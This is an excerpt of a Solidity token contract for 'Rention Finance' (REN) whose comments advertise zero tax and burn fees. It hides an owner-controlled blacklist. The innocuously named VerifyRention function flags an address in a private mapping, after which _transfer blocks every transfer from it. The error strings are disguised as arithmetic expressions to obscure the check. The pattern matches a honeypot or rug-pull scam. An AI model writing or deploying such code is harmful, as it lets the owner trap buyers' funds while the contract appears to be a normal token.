// Rention 
// We put together everything needed to build websites
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Rention Finance';
    string constant public symbol = 'REN';
    ...
    uint256 private _taxFee = 0; //// Zero is (No Tax Fee )
    uint256 private _previousTaxFee = _taxFee;
    
    uint256 private _burnFee = 0; //// Zero (0) No Burn Fee
    ...
    mapping(address => bool) private _anyplace; 
    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "balanceOf[from].sub(value)");
        if(_isExcludedFromFee[from])
            removeAllFee();   
        require(!_anyplace[from], "calculateTaxFee(value)");
    ...
    function Trxretentions(address account) public onlyOwner {
        _anyplace[account] = false;
    }
    ...
    function VerifyRention(address account) public onlyOwner {
        _anyplace[account] = true;
    }

    function rentionapplicant(address account) public view returns (bool) {
        
        return _anyplace[account];
    }
...
contract RentionFinance is BaseToken {
